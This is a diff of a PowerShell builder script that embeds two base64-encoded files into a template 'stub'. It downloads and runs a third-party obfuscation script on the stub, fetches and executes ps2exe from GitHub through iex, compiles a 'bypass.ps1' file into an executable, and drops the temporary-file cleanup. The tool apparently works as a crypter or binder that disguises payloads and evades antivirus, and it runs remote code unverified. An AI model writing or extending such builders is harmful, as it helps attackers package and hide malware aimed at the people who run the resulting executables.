@@ -1,3 +1,8 @@
+$url = "https://raw.githubusercontent.com/test1213145/powershell-obfuscation/main/powershell-obfuscation.ps1"
+$localPath = "powershell-obfuscation.ps1"
+Invoke-WebRequest -Uri $url -OutFile $localPath
+
+
 function Get-Base64Content {
     param (
         [string]$filePath
@@ -37,20 +42,16 @@ function Build-Script {
 
     $finalScript = Replace-Placeholders -templateContent $templateContent -base64File1 $base64File1 -base64File2 $base64File2 -fileEnding1 $fileEnding1 -fileEnding2 $fileEnding2
 
-    $outputPath = "final_script.ps1"
+    $outputPath = "stub.ps1"
     Set-Content -Path $outputPath -Value $finalScript -Encoding UTF8
+    .\powershell-obfuscation.ps1 -f "$outputPath"
 
     Write-Host "Script built successfully. Output file: $outputPath"
 
     # Download and run ps2exe to convert the script to an executable
     iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MScholtes/PS2EXE/master/Module/ps2exe.ps1')
-    Invoke-ps2exe -inputFile $outputPath -outputFile "$outputPath.exe"
+    Invoke-ps2exe -inputFile "bypass.ps1" -outputFile "$outputPath.exe"
     Write-Host "Executable created successfully. Output file: $outputPath.exe"
-
-    if ($remove) {
-        Remove-Item -Path $outputPath -Force
-        Write-Host "Temporary PowerShell script removed."
-    }
 }
 
 # Prompt for inputs
